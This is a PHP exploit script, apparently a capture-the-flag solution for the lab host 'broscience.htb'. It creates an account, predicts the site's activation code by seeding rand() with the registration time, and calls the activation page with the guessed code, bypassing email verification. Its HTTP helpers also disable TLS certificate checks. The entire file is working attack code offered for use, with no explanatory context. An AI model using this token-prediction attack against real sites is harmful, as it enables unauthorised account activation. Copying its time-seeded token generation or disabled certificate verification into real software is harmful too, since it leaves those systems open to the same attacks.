<?php

function generate_activation_code($time) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand($time);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

function httpPost($url, $data)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}


function httpGet($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

$url        = "https://broscience.htb/register.php";
$creds      = $argv[1];
$email      = "$creds@email.com";

$data = [
    'username'          => $creds,
    'email'             => $email,
    'password'          => $creds,
    'password-confirm'  => $creds
];

$time = time();
echo "[+] Creating Account with username $creds and password $creds....\n";
$output = httpPost($url, $data);

if (strpos($output, "Account created") !== false){
    $generateCode = generate_activation_code($time + 2);
    echo "[+] Account created!\n[+] Process activating account with activation code $generateCode....\n";
    
    $actUrl = "https://broscience.htb/activate.php?code=$generateCode";
    $activate = httpGet($actUrl);
    
    if (strpos($activate, "Account activated!") !== false){
        echo "[+] Account with username $creds and password $creds activated!\n";
    }

} else {
    echo "Register Failed!";
}
 
?>
